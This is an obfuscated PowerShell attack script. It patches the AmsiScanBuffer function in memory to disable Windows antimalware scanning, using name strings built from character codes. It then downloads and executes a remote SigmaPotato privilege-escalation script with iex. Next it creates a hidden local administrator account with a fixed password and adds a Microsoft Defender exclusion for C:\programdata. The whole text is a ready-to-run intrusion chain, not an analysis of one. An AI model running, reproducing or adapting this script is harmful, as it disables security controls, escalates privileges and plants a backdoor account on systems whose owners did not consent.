#Rasta-mouses Amsi-Scan-Buffer patch \n
$cRwWNCsi20h69 = @"
using System;
using System.Runtime.InteropServices;
public class cRwWNCsi20h69 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr N_IeiW8kxAvN3, string YkodBS8bq);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ghBsmIKpKpuvQfaX9h, UIntPtr gjZz, uint AY3, out uint cKAatyM);
}
"@

Add-Type $cRwWNCsi20h69

$WmLtgB0Cm5i0NVyUh1wM = [cRwWNCsi20h69]::LoadLibrary("$(('ámsí.'+'dll').noRMaLizE([ChaR](70)+[chAr](111)+[ChaR]([BytE]0x72)+[char](91+18)+[Char]([BYTe]0x44)) -replace [cHar]([bytE]0x5c)+[CHAR](12+100)+[ChAr]([BYTE]0x7b)+[ChAR](58+19)+[chaR](110*99/99)+[cHAr](125+5-5))")
$qOw = [cRwWNCsi20h69]::GetProcAddress($WmLtgB0Cm5i0NVyUh1wM, "$([CHar](65*57/57)+[char]([bYtE]0x6d)+[cHar]([BYTE]0x73)+[char]([byTe]0x69)+[ChaR](83+43-43)+[CHAR]([bytE]0x63)+[CHAR](97*35/35)+[ChAr](110+49-49)+[char]([ByTe]0x42)+[char](117)+[CHar](102+51-51)+[cHar](102*19/19)+[CHAR](91+10)+[ChaR](114))")
$p = 0
[cRwWNCsi20h69]::VirtualProtect($qOw, [uint32]5, 0x40, [ref]$p)
$ETEGahTwJ_w8bgreZh = "0xB8"
$rn3a = "0x57"
$VjXm_CMVHgt3FvAkDiR8 = "0x00"
$LgF = "0x07"
$jC6VYz2ie = "0x80"
$KO6iJF_ZL2itTn = "0xC3"
$whol3nyNFT9K4nhYZ = [Byte[]] ($ETEGahTwJ_w8bgreZh,$rn3a,$VjXm_CMVHgt3FvAkDiR8,$LgF,+$jC6VYz2ie,+$KO6iJF_ZL2itTn)
[System.Runtime.InteropServices.Marshal]::Copy($whol3nyNFT9K4nhYZ, 0, $qOw, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
















